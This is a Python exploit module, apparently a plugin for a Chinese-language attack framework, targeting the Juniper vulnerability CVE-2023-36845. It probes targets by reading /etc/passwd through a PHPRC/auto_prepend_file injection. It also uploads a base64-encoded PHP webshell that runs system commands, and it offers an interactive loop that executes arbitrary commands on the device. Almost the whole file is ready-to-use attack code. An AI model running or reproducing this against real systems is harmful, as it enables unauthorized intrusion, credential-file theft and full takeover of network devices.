#!/user/bin/env python3
# -*- coding: utf-8 -*-
import urllib3
import requests
import base64
from pub.com.outprint import OutPrintInfo,OutPrintInfoErr,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
urllib3.disable_warnings()
class Cve_2023_36845:
    def check(self,url):
        req_url = f"{url}/?PHPRC=/dev/fd/0"
        try:
            response = requests.post(req_url, data={'auto_prepend_file': '/etc/passwd'}, verify=self.ssl, timeout=5,
                                     headers=self.headers, proxies=self.proxies)
            if 'root:x' in response.text:
                OutPrintInfoSuc("Juniper", f'存在Juniper任意代码执行漏洞 {req_url}')
                if not self.batch:
                    OutPrintInfo("Juniper", f"响应: \n{response.text.strip()}")
                else:
                    with open("./result/juniper_2023_36845.txt","a") as w:
                        w.write(f"{req_url}\n")
            else:
                if not self.batch:
                    OutPrintInfo("Juniper", '不存在Juniper任意代码执行漏洞')
        except requests.RequestException as e:
            pass
    def shell(self,url):
        req_url = f"{url}/webauth_operation.php"
        data = {
            'rs': 'do_upload',
            'rsargs[]': '[{"fileName": "shelsl.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo= ", "csize": 110}]'
        }
        try:
            response = requests.post(req_url, data=data, verify=self.ssl, timeout=5,
                                     headers=self.headers, proxies=self.proxies)
            response2 = requests.get(req_url, verify=self.ssl, timeout=5,
                                     headers=self.headers, proxies=self.proxies)

            if response2.status_code == 200 and response2.url == f"{url}/shelsl.php":
                OutPrintInfo("Juniper", '[b bright_red]Shell上传成功')
                OutPrintInfo("Juniper", f"[b bright_red]Shell {url}/shelsl.php")
            else:
                OutPrintInfo("Juniper", 'Shell上传失败')
        except requests.RequestException as e:
            pass
    def cmd(self,url,cmd):
        req_url = f"{url}/?PHPRC=/dev/fd/0"
        try:
            cmd_str = f"<?php shell_exec('{cmd}'); ?>\n"
            cmd_base64 = base64.b64encode(cmd_str.encode()).decode()
            data = f'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,{cmd_base64}"'
            response = requests.post(req_url, data=data, verify=self.ssl, timeout=5,
                                     headers=self.headers, proxies=self.proxies)
            response.encoding = response.apparent_encoding
            if response.status_code == 200:
                OutPrintInfo("Juniper", response.text)
            else:
                OutPrintInfo("Juniper", '不存在Juniper任意代码执行漏洞')
        except requests.RequestException as e:
            pass
    def main(self,target):
        self.batch = target["batch_work"]
        OutPrintInfo("Juniper", '开始检测Juniper任意代码执行漏洞')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        OutPrintInfo("1", '检测漏洞是否存在')
        OutPrintInfo("2", '上传webshell')
        OutPrintInfo("3", '执行命令')
        choose = Prompt.ask("[b cyan]输入对应编号执行脚本")
        self.headers, self.proxies = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            if choose == "1":
                self.check(url)
            elif choose == "2":
                self.shell(url)
            elif choose == "3":
                while True:
                    cmd = Prompt.ask("[b cyan]输入需要执行的命令")
                    if cmd == "exit":
                        break
                    self.cmd(url,cmd)
            else:
                OutPrintInfoErr(f"{choose}")
            OutPrintInfo("Juniper", 'Juniper任意代码执行漏洞检测结束')
        else:
            self.check(url)


